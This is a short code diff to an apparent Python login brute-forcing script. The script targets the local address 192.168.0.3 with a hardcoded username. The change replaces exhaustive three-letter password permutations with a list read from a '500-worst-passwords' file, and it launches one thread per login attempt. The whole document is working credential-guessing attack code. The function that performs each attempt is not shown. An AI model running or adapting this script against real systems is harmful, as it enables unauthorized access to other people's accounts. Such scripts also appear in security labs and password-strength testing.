@@ -20,13 +20,15 @@ def attempt(IP,UserName,Password):
 ip = '192.168.0.3'
 username = 'michaeltruell'
 start_time = time.time()
-passwordDictionary = open("")
-permutations = itertools.product(string.ascii_lowercase, repeat=3)
+passwordFile = open("500-worst-passwords.txt")
+###permutations = itertools.product(string.ascii_lowercase, repeat=3)
+permutations = [line.rstrip('\n') for line in passwordFile]
 index = 0
 for permutation in permutations:
-    password = ''.join(permutation)
+    ##password = ''.join(permutation)
+    password = permutation
     index += 1
-    if index % 1 == 0:
+    if index % 100 == 0:
         print ("on: %s" % password)
     t = threading.Thread(target=attempt, args=(ip,username,password))
     t.start()
